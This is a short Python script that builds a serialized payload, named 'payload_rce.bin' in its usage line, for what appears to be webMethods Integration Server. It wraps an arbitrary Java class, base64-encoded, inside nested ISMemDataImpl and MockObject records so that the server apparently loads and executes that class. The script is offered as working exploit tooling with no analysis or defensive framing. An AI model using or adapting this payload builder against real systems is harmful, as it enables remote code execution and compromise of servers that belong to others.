#!/usr/bin/env python3
#
# Usage: python3 build_payload.py OOBProbe.class OOBProbe payload_rce.bin

import sys, base64


def length_header(tag, n):
    if n > 255:
        return bytes([0x80 | tag]) + n.to_bytes(4, "big", signed=False)
    return bytes([tag, n])


def s(x):
    return length_header(4, len(x)) + x.encode("utf-16-be")


def i32(v):
    return bytes([11, 0]) + v.to_bytes(4, "big", signed=False)


NULLV = bytes([2, 0])


def record(classname, entries):
    out = bytes([5, 0]) + s(classname)
    for k, vbytes in entries:
        out += s(k) + vbytes
    out += NULLV
    return out


def main():
    class_file, class_name, out_file = sys.argv[1], sys.argv[2], sys.argv[3]
    class_bytes = open(class_file, "rb").read()
    b64 = base64.b64encode(class_bytes).decode("ascii")

    inner = record(
        "com.wm.data.ISMemDataImpl",
        [
            ("_mainMockDataFactoryClasssname", s(class_name)),
            (class_name, s(b64)),
        ],
    )

    outer = record(
        "com.wm.data.ISMemDataImpl",
        [
            ("KEY_TYPE", i32(3)),
            ("KEY_IDATA", inner),
        ],
    )

    tag18 = bytes([18, 0]) + s("com.wm.ps.serviceMock.MockObject") + outer

    payload = bytes([2, 0]) + tag18  # version NULL + valeur top-level

    open(out_file, "wb").write(payload)
    print(
        f"{len(payload)} octets ecrits dans {out_file} (classe: {class_name}, bytecode: {len(class_bytes)} octets, base64: {len(b64)} chars)"
    )


if __name__ == "__main__":
    main()


